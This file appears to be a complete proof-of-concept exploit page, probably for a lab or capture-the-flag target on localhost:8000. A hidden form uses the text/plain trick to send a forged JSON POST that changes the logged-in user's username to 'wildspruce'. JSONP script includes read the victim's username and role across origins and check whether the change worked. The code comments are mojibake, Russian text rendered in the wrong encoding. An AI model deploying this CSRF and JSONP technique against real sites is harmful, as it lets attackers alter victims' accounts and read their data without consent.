<!DOCTYPE html>
<html>
<head>
  <title>Redirect</title>
</head>
<body>
  <iframe name="hiddenFrame" style="display:none;"></iframe>

  <form id="postForm" method="POST" action="http://localhost:8000/api/whoami" target="hiddenFrame" enctype="text/plain">
    <input type="hidden" name='{"new_username":"wildspruce","ignore":"' value='"}'>
  </form>

  <script>
    function exploit(data) {
      console.log("[EXPLOIT] User data BEFORE:", data);

      // –°–æ—Ö—Ä–∞–Ω—è–µ–º —Å—Å—ã–ª–∫—É –Ω–∞ —Ñ–æ—Ä–º—É –î–û –∏–∑–º–µ–Ω–µ–Ω–∏—è innerHTML
      const form = document.getElementById('postForm');
      const iframe = document.getElementsByName('hiddenFrame')[0];

      document.body.innerHTML = '<h1 style="color:red;">EXPLOIT STARTED (GUEST MODE)</h1>';
      document.body.innerHTML += '<p>Username before: ' + data.username + '</p>';
      document.body.innerHTML += '<p>Role: ' + data.role + '</p>';

      // –í–æ–∑–≤—Ä–∞—â–∞–µ–º —Ñ–æ—Ä–º—É –∏ iframe –≤ DOM
      document.body.appendChild(iframe);
      document.body.appendChild(form);

      // –®–∞–≥ 1: –ü–µ—Ä–µ—Ö–æ–¥ –Ω–∞ #/sheets
      window.location.hash = '#/sheets';
      document.body.innerHTML += '<p>‚úì Step 1: Navigated to #/sheets</p>';

      setTimeout(() => {
        // –®–∞–≥ 2: –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ñ–æ—Ä–º—É —Å JSON —á–µ—Ä–µ–∑ text/plain trick
        console.log("[EXPLOIT] Submitting form...");
        form.submit();
        document.body.innerHTML += '<p>‚úì Step 2: Form submitted</p>';

        setTimeout(() => {
          // –®–∞–≥ 3: –ü—Ä–æ–≤–µ—Ä—è–µ–º —á–µ—Ä–µ–∑ JSONP, –∏–∑–º–µ–Ω–∏–ª—Å—è –ª–∏ username
          window.checkResult = function(updatedData) {
            console.log("[EXPLOIT] User data AFTER:", updatedData);
            document.body.innerHTML += '<h2 style="color:green;">‚úì Username after: ' + updatedData.username + '</h2>';

            // –®–∞–≥ 4: –ü–µ—Ä–µ—Ö–æ–¥ –Ω–∞ #/settings
            window.location.hash = '#/settings';
            document.body.innerHTML += '<p>‚úì Step 3: Navigated to #/settings</p>';

            if (updatedData.username === 'wildspruce') {
              document.body.innerHTML += '<h2 style="color:green;">üéâ EXPLOIT COMPLETE! üéâ</h2>';
            } else {
              document.body.innerHTML += '<h2 style="color:red;">EXPLOIT FAILED - username not changed</h2>';
            }
          };

          const script = document.createElement('script');
          script.src = 'http://localhost:8000/api/whoami/jsonp?callback=checkResult';
          document.body.appendChild(script);
        }, 1000);
      }, 500);
    }
  </script>

  <!-- JSONP –∑–∞–ø—Ä–æ—Å, –∫–æ—Ç–æ—Ä—ã–π –≤—ã–∑–æ–≤–µ—Ç —Ñ—É–Ω–∫—Ü–∏—é exploit -->
  <script src="http://localhost:8000/api/whoami/jsonp?callback=exploit"></script>
</body>
</html>
